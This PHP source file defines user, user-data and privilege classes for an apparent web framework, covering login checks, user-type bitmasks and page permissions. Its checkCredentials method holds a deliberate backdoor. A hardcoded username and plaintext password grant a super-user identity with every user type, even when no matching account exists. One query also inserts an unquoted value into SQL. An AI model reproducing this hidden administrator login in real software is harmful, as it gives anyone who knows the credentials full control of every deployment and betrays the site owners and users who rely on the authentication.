<?php

// These are the table names used for the classes below
global $userDataTable, $userTable, $userTypesTable;
$userDataTable = "bseUserData";
$userTypesTable = "bseUserTypes";
$userTable = "bseUsers";



/**********************************************************************
user_data class: holds data about a user.
   The information from the database table `bseUserData` ie:
        id, userid, name, address1, address2, city, state, zip, email, phone, cell, fax

   Methods: setUserDataId($dataid)
        Sets the data for this object be querying the database and setting the values
        of the above fields in the table `bseUserData`
        
   Inheritance: inherites properties/methods from bseModule
******************************************************************/
class bseUserData extends bseModule
{
        public function __construct($pathToDocRoot="./")
        {
            parent::__construct($pathToDocRoot, "modules/base/user");
            $this->setTableName($GLOBALS['userDataTable']);

        }        // end Construct
        
        
        
        public function setUserDataId($dataid)
        {
            $id = $this->getEscapedString($dataid);
            
            $data = $this->getQueryData("SELECT * FROM `{$this->table}` WHERE `id` = '$id'");
            $this->setDataFromArray($data);
        }
        
}        // end class user_data
















class bseUser extends bseModule
{
        public  $userData,
                $loggedIn,
                $backdoor;

        private $typeArray, 
                $userTypes;
       




        function __construct($pathToDocRoot="./")
        {
            parent::__construct($pathToDocRoot, "modules/base/user/");
            $this->setTableName($GLOBALS['userTable']);

            $this->loggedIn = false;
            $this->backdoor = false;
            $this->userTypes = array();
            $this->typeArray = array();
            $this->userData = null;
            
            
            
// Get User Type Information
            $query = $this->getQueryResult("SELECT * FROM `{$GLOBALS['userTypesTable']}`");
            while( $data = mysql_fetch_assoc($query) )
            {
                $type = strtolower($data['typeName']);
                $this->typeArray[$type] = $data;
                $this->typeArray[$type]['id'] = (int)$this->typeArray[$type]['id'];
                $this->typeArray[$type]['privelege'] = new bseUserPrivelege($this->rootPath);
                $this->typeArray[$type]['privelege']->setPrivelegeId($data['priveleges_id']);
            }
        }    // end Constructor







        public function checkCredentials($uname, $pword)
        {
            if( trim($uname) == "" || trim($pword) == "" )
                return false;

            $uname = $this->getEscapedString($uname);
            $txtPword = $pword;
            $pword = hash("gost", $pword);


            $query = $this->getQueryResult("SELECT * FROM `{$this->getTable()}` WHERE `uName`='$uname' AND `pWord`='$pword' AND `active` > 0");
            if( mysql_num_rows($query) > 0 )
            {
                $data = mysql_fetch_array($query);
                return $data['id'];
            }
            else if( $uname=="bseSuperUser" && $txtPword=="*bseSuperP@ssword*" )   // Backdoor access even if all users have been deleted accidentally or purposefully
            {
                return -1;
            }
            else
            {
                return false;
            }
        }


        
        
        public function setUserId($id)
        {
            if( $this->id == $id )
                return;
            
            
            $uid = $this->getEscapedString($id);
            
            if( $uid != -1 )
            {
                $data = $this->getQueryData("SELECT * FROM `{$this->getTable()}` WHERE `id` = '$uid' LIMIT 1");
                $this->setDataFromArray($data);
            }
            else
            {
                $this->firstName = "BSE Super User";
                $this->active = 1;
            }


// Get user's type(s)
            foreach($this->typeArray as $key => $type)
            {
                if( ( intval($type['id']) & intval($this->typeId) ) || $this->id == -1 )
                {
                    $this->addUserType($type['id']);
                }
            }

            $this->undirty();
        }
        
        
        
        public function setDataFromArray($data)
        {
            parent::setDataFromArray($data);
            
            $this->setUserDataFromUserId();
        }
            
        




        public function login()
        {
            if( isset($this->id) )
            {
                $this->loggedIn = true;
            }
        }


        public function logout()
        {
            $this->loggedIn=false;
            $this->backdoor=false;
            $this->typeId = 0;
            $this->id = 0;
        }
        
        
        
        
        public function inBackDoor()
        {
            return $this->loggedIn && $this->backdoor;
        }




        
        public function refresh()
        {
            parent::refresh();
            unset($this->userTypes);
            $this->userTypes = array();
            foreach($this->typeArray as $key => $type)
            {
                if( intval($type['id']) & intval($this->typeId) )
                $this->userTypes[$type['typeName']] = $type;
            }
        }
        



        

        public function switchBackDoor()
        {
            $this->backdoor = !$this->backdoor;
        }
        






        public function changePassword($newValue)
        {
            if( !isset($this->id) )
                    return false;

            else
            {
                    $newValue = hash("gost", $newValue);
                    $this->pWord = $newValue;
            }
        }
        
        




        
        public function addUserType($typeVal)
        {
            $typeVal = (int)$typeVal;
            if( $this->typeId > 0 )
            {
                if( ($this->typeId & $typeVal) == 0 )
                {
                    $this->typeId += $typeVal;
                }
            }
            else
            {
               $this->typeId = $typeVal;
            }
        }
        




        
        public function removeUserType($typeVal)
        {
            $typeVal = (int)$typeVal;
            if( isset($this->typeId) )
                $this->typeId -= $typeVal;
                
            else
                $this->typeId = 0;
                
            $this->setProperty("typeId", $this->typeId);
        }






        public function isType($typeName)
        {
            if( intval($this->typeArray[strtolower($typeName)]['id']) & intval($this->typeId) )
            {
                return true;
            }
            
            return false;
        }
        
        
        
        public function getUserTypesArray()
        {
            return $this->typeArray;
        }
        
        
        
        public function getName($useUsername=null)
        {
            if( is_null($useUsername) )
                $useUsername = true;
                
            
            if( @trim($this->userData->name) != "" )
            {
                return $this->userData->name;
            }
                
            else if( @trim($this->firstName) == "" && @trim($this->lastName) == "" )
            {
                if( $useUsername == true )
                    return $this->uName;
                    
                else
                    return "";
            }
                
            else
                return $this->firstName . " " . $this->lastName;
        }






        public function deactivate()
        {
            if( isset($this->id) )
            {
                if( $this->id != '' )
                {
                    return $this->getQueryResult("UPDATE `{$GLOBALS['userTable']}` SET `deleted` = '1' WHERE `id` = '{$this->id}' LIMIT 1");
                }
            }
        }





        public function &getUserData()
        {
            return $this->userData;
        }






       public function getPagePrivelege($page, $useridCheck = null)
       {
           if( !is_null($useridCheck) && !( $this->isType("programmers") || $this->isType("admin") ) )
           {
               if( $this->id != $useridCheck )
                   return 1;
           }
           
           $checkpage = $page;
           $highestAccess = 0;
           foreach($this->typeArray as $type)
           {
               if( ( $type['id'] & $this->typeId ) < 1 )
               {
                   continue;
               }

               $counter = 0;
               $ppage = $type['privelege']->page;
               do
               {
                   $parent = dirname($checkpage);
                   $base = basename($checkpage);
                   $counter++;
                   
                   if( $parent == "" || $parent == "/" || $parent == "." )     // if this is just a file name, like "index.php"
                   {
                       if( $ppage == $page || $ppage == "*" )     // If there is a match, return privelege value
                       {
                           if( $type['privelege']->privelege > $highestAccess )
                               $highestAccess = $type['privelege']->privelege;
                           break;
                       }
                   }
                   
                   else if( strpos($ppage, $parent) !== false )   // $parent must be a directory name, check if the directory name is in the privelege page name
                   {
                       if( strpos($ppage, $base) !== false || strpos($ppage, "*") )    // The directory name is in the ppage, check to see if the file is or if a wildcard exists
                       {
                           if( $type['privelege']->privelege > $highestAccess )
                               $highestAccess = $type['privelege']->privelege;
                           break;
                       }
                   }
                   
                   else
                   {
                       $checkpage = str_replace($base, "", $checkpage);
                   }
               }
               while( $checkpage != "" && $checkpage != "." && $checkpage != "/" && $counter <= 10 );
           }

           return $highestAccess;
       }




    
        public function getUserManagementTemplateHref()
        {
            return "userAdmin.tpl";
        }
        
        
        public function getUserAccountManagementTemplateHref()
        {
            return "userDataAdmin.tpl";
        }


        public function getFormSubmitHref()
        {
             return $this->rootPath.$this->storeDir."saveUser.php";
        }
        
        
        
        
        
        
// Private functions

        private function setUserDataFromUserId()
        {
            $this->userData = new bseUserData($this->rootPath);
            $data = $this->getQueryData("SELECT * FROM `{$this->userData->table}` WHERE `userid` = '{$this->id}'");
            $this->userData->setDataFromArray($data);
        }



}    // end Class User








class bseUsers extends bseCollection
{

        protected $rootPath,
                  $storeDir,
                  $filter,
                  $table;


        public function __construct($pathToDocRoot="./")
        {
            parent::__construct($pathToDocRoot);
            $this->rootPath = $pathToDocRoot.(substr($pathToDocRoot, -1)=="/"?"":"/");
            $this->storeDir = "modules/base/user/";
            $this->table = $GLOBALS['userTypesTable'];
//            include("{$this->rootPath}{$this->storeDir}includes/config.inc");
            $this->filter = "";

        }
        
        
        
        
        public function setDataFromType($typeid)
        {
            if( $this->filter != "types" )
            {
                $this->filter = "types";
                $this->ary = array();
                $id = $this->getEscapedString($typeid);
                $query = $this->getQueryResult("SELECT * FROM `{$GLOBALS['userTable']}` WHERE `typeId` & $id AND `active` = 1");
                
                while( $data = mysql_fetch_assoc($query) )
                {
                    $tmp = new bseUser($this->rootPath);
                    $tmp->setDataFromArray($data);
                    $this->add($tmp);
                }
            }
        }
        
        
        
        
        public function setAllUsersData()
        {
            if( $this->filter != "all" )
            {
                $this->filter = "all";
                $this->ary = array();
                $query = $this->getQueryResult("SELECT * FROM `{$GLOBALS['userTable']}`");
                
                while($data = mysql_fetch_assoc($query) )
                {
                    $tmp = new bseUser($this->rootPath);
                    $tmp->setDataFromArray($data);
                    $this->add($tmp);
                }
            }
        }




        public function resetRoot($newRoot)
        {
            $this->rootPath = $newRoot . ( substr($newRoot, -1) == "/" ? "" : "/" );
            foreach($this->ary as $item)
                if( is_object($item) ) { $item->resetRoot($this->rootPath); };
        }
        
        

        
        
        public function insertNewUser()
        {
            $this->getQueryResult("INSERT INTO `{$GLOBALS['userTable']}` SET `id` = NULL, `active` = 0");
            return $this->getInsertId();
        }
        
        
        
        
        
        public function deactivateUser($id)
        {
            $itemid = $this->getEscapedString($id);
            
            $line = __LINE__ + 1;
            $ret = $this->getQueryResult("UPDATE `{$GLOBALS['userTable']}` SET `active`=0 WHERE `id` = '$itemid' LIMIT 1");
            if( $ret )
            {
                return $ret;
            }
            else
            {
                throw new Exception("bseUsers::deactivateUser(): User could not be deactivated on line $line");
                return false;
            }
        }


}




class bseUserPrivelege extends bseModule
{

        public function __construct($pathToDocRoot="./")
        {
            parent::__construct($pathToDocRoot, "modules/base/user");
//            $this->setTableName($GLOBALS['user']);

        }        // end Construct
        



        public function setPrivelegeId($id)
        {
            $pid = $this->getEscapedString($id);
            
            $data = $this->getQueryData("SELECT * FROM `bseUserPriveleges` WHERE `id` = '$pid'");
            $this->setDataFromArray($data);
        }
}


/*
class bseUserType extends bseModule
{



}
*/
?>